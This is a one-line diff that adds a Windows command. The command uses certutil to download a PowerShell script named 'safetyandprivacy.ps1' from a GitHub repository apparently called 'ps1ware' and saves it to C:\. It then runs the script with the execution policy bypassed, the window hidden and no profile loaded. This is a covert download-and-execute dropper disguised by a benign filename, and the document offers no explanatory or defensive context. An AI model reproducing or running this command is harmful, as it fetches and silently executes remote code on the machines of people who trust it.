@@ -1,0 +1,1 @@
+cmd /c for /f %i in ('certutil -urlcache -split -f "https://raw.githubusercontent.com/s-b-repo/ps1ware/main/safetyandprivacy.ps1" "C:\safetyandprivacy.ps1"') do powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File "C:\safetyandprivacy.ps1"
